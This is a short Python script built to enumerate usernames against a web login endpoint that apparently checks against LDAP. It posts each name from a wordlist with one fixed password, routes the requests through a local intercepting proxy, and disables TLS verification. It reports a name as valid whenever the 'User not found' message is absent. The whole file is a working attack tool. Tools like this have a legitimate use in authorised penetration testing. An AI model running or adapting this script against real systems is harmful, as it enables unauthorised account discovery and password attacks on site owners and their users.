#!/usr/bin/env python
import requests, sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def send_request(username, password):
    url = 'https://website.com/cache_login/ldapCon.php'
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'https://127.0.0.1:8080'
        }
    body = {
        'username':'%s' % username.strip(),
        'pass':'%s' % password.strip(),
        'submit':'Submit+Query'
        }
    s = requests.Session()
    return s.post(url,data=body,verify=False,allow_redirects=True,proxies=proxies)

 
if __name__ == '__main__':
    if len(sys.argv) != 3:
        print '(!) Usage: %s <username_list> <password>' % sys.argv[0]
    username_list = sys.argv[1]
    password = sys.argv[2]
    usernames = open(username_list, 'r')
    for username in usernames:
        response = send_request(username, password)
        if not "User not found" in response.text:
            print("(+) Found valid username!: %s" % username)
    print("(-) Done!")
